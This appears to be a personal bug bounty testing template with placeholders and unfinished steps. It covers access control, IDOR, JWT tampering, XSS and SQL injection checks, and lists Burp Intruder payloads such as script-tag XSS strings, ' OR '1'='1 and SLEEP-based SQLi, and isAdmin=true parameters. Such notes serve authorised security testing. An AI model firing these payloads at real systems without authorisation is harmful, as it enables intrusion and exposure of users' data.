# Target Structure :

# Bug Bounty Recon & Testing Notes  
*Target: [`PROGRAM NAME`]*

---

## Assets
- Main domains: [ ]
- Subdomains: [ ]
- API endpoints: [ ]

*(Tip: Collect from scope + recon tools. Add into Burp Target > Site Map.)*

---

## Guidelines
- Max requests/sec: [ ]
- VPN requirement: [ ]
- User-Agent: [ ]
- Header: [ ]

---

## Credentials
- Victim:  
- Attacker:  

*(Tip: Always test with 2 accounts – compare responses in Burp.)*

---


### First Few Hours On A New Domain 
Goal : Get quick coverage on high-probability bugs before diving deeper. 


**Small Steps** : 

- Step 1: Map the surface → List out endpoints, identifiers, subdomains, login portals, and APIs. (Even if it feels boring, this makes the unknown less intimidating.)

    // NOT FINISHED

- Step 2: Find user flows → Try the obvious things: signup/login, profile update, password reset, payment or balance check. These are universal across nearly every web app type.

    // NOT FINISHED


- Step 3: Auth cookies and HTTPOnly Check -> Take your targeted endpoints and try the request with 1 cookie at a time and find which cookies are used for authentication. Then check which cookies in the Network tab are set to HTTPOnly. 


    // NOT FINISHED



- Step 4: Access control checks → Try switching IDs, replaying requests with another account, or skipping authorization headers. That horizontal IDOR you already caught is a repeatable test case.

    // NOT FINISHED


- Step 5: Keep notes short and portable → That way, whether it’s crypto, e-commerce, or some SaaS dashboard, you’re not reinventing your workflow—you’re running the same playbook.



### Domains


### Endpoint Enumeration

### Authentication
-  /login  [ ]
-  /logout [ ]
- /reset-password [ ]

### Account Management
- /account/overview [ ]
- /account/orders [ ]
- /account/wishlist  [ ]
- account/settings  [ ]

### API Endpoints
- /api/v1/users [ ]
- /api/v1/orders [ ]
- /api/v1/cart [ ]  
- /api/v1/wishlist [ ]

*(Tip: Populate as you explore. Save juicy ones in Burp Repeater.)*

------------------
------------------




---------



### 1. Broken Access Control (Quick Tests)

  Victim : 
Request : 
<!-- Victims Normal Request and Response -->
Response : 

// VICTIMS NORMAL REQUEST AND RESPONSE  


**What ID's in the Request or Response do you see that identify the Victim :**
 

**Broken Access Control** : 
- Replay the request with another users ID's, does it leak data or perform an action on the Victims account? 


- Remove session cookies and see if the request works (does it leak data or perform an action on a victims account?)


- Change the HTTP Method, does it leak data or perform an action on a victims account?
 (GET ↔ POST, DELETE, PATCH).


**Intruder Payloads (IDs & Tokens):**
```
id
user_id
userid
uid
account_id
profile_id
record_id
order_id
session_id
auth
auth_token
access_token
token

```

**Quick Win Targets:**  
`/users/{id}`
`/orders/{id}`
`/profile`
`/api/v1/*`  

---------




### 2. Reflected XSS (Quick)

**Check:**
- Test query parameters and URL paths for reflection. 

- Look for HTML/JS context in response.  

**Intruder Payloads (Queries & URL Paths):**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
</script><script>alert(1)</script>
<svg/onload=alert(1)>
" onfocus=alert(1) "
</textarea><script>alert(1)</script>

%3Cscript%3Ealert(1)%3C%2Fscript%3E
&lt;img src=x onerror=alert(1)&gt;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

```

**Parameters to Target:**
```
?q=
?search=
?query=
?term=
?redirect=
?next=
?returnUrl=
?username=
?email=
?name=
?message=

```

---------



### 3. Stored XSS (Quick)

**Check:**
- Inputs that get saved: profile fields, comments, messages, reviews.

- Verify if payload persists in later views.  

**Intruder Payloads:**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
</script><script>alert(1)</script>
<svg/onload=alert(1)>
" onfocus=alert(1) "
</textarea><script>alert(1)</script>

%3Cscript%3Ealert(1)%3C%2Fscript%3E
&lt;img src=x onerror=alert(1)&gt;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

```

**Parameters to Target:**
```
name
title
description
message
comment
notes
content
review
feedback
subject

```

---------

### 4. IDOR (Horizontal & Vertical)

**Horizontal (Same-level Users):**  
- Change IDs in request params.  

- Replace with sequential numbers (`1,2,3...`).  

**Vertical (Privilege Escalation):**  
- Add admin-related parameters.  

**Payloads:**
```
isAdmin=true
role=admin
accessLevel=admin

```

---

### 5. JWT Quick Checks

**Check:**
- Decode token (jwt.io / Burp Decoder). 

- Try `alg:none` (strip signature). 

- Modify claims (`role`, `isAdmin`, `user_id`).  

**Parameters to Target:**
```
Authorization: Bearer <token>
access_token
id_token
jwt
session_token

```

---

### 6. SQL Injection (Quick)

**Check:**
- Insert `' OR '1'='1` in parameters.  

- Use time delays if no response difference.  

**Intruder Payloads:**
```
' OR '1'='1
" OR "1"="1
' OR SLEEP(5)--
' UNION SELECT NULL,NULL--

```

**Parameters to Target:**
```
id
user
username
email
search
q
product_id
order_id
category

```

---

### 7. Unauthenticated Access

**Check:**
- Replay API calls without tokens.  

- Directly access `/admin`, `/dashboard`, `/profile`.  

- Try parameter injection (`isAdmin=true`) in unauth requests.  

---

